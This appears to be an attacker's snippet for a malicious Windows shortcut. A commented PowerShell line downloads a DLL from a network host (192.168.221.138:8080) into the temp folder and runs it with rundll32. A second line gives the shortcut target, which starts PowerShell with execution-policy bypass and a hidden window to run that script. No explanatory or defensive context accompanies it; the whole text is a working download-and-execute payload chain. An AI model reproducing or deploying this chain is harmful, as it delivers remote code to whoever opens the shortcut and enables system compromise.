# script the shortcut is targeting
$p = "$env:TMP\p.dll";curl 192.168.221.138:8080/p.dll -Out $p;rundll32.exe $p, p
# the shortcut target
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exe Bypass -Win hid .\b.ps1 
